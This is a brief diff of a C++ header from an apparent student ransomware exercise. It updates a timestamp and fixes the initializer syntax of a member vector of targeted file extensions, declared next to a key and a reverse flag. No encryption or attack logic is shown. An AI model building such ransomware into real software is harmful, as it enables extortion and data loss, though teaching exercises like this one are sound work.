@@ -6,7 +6,7 @@
 /*   By: bguyot <bguyot@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/05/19 09:43:26 by bguyot            #+#    #+#             */
-/*   Updated: 2023/05/19 13:25:39 by bguyot           ###   ########.fr       */
+/*   Updated: 2023/05/19 13:28:36 by bguyot           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -29,7 +29,7 @@ private:
 	bool _reverse;
 	std::string _key;
 	const std::filesystem::path _path;
-	const std::vector<std::string> _extensions({RANSOMWARE_EXTENSIONS});
+	const std::vector<std::string> _extensions{RANSOMWARE_EXTENSIONS};
 
 	void _printHelp(void);
 	void _printVersion(void);
